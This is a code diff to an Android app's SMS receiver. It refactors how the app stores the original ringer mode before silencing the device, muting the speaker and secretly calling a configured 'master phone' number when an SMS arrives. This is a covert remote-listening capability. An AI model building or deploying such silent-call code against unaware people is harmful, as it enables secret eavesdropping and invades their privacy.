@@ -67,10 +67,6 @@ public class SmsReceiver extends BroadcastReceiver
 	private static final String SMS_RECEIVED = "android.provider.Telephony.SMS_RECEIVED";
 	private Context context;
 	
-	public static int ORIGINAL_RING_MODE;
-	public static int ORIGINAL_RING_VOL;
-	public static int ORIGINAL_VOICE_CALL_VOL;
-	
 	// **************************************************************************************
     // Receiver for SMS handling
 	// **************************************************************************************
@@ -231,16 +227,12 @@ public class SmsReceiver extends BroadcastReceiver
 						try {
 							// Disable ringer and vibrate
 							AudioManager am = (AudioManager) SmsReceiver.this.context.getSystemService(Context.AUDIO_SERVICE);
-							ORIGINAL_RING_MODE = am.getRingerMode();
-							if (ORIGINAL_RING_MODE == AudioManager.RINGER_MODE_NORMAL) {
-								ORIGINAL_RING_VOL = am.getStreamVolume(AudioManager.STREAM_RING);
-							}
+							GlobalValues.ORIGINAL_RING_MODE = am.getRingerMode();
 							am.setRingerMode(AudioManager.RINGER_MODE_SILENT);
 						
-							// Lower phone call volume to min
-							ORIGINAL_VOICE_CALL_VOL = am.getStreamVolume(AudioManager.STREAM_VOICE_CALL);
-							am.setStreamVolume(AudioManager.STREAM_VOICE_CALL, 0, 0);
-						
+							// Mute speaker
+							am.setSpeakerphoneOn(false);
+							
 							// Call master phone
 							String masterPhone = GlobalPrefActivity.getReceiverPhoneNum(SmsReceiver.this.context);
 							Uri uri = Uri.parse("tel:" + masterPhone);			          
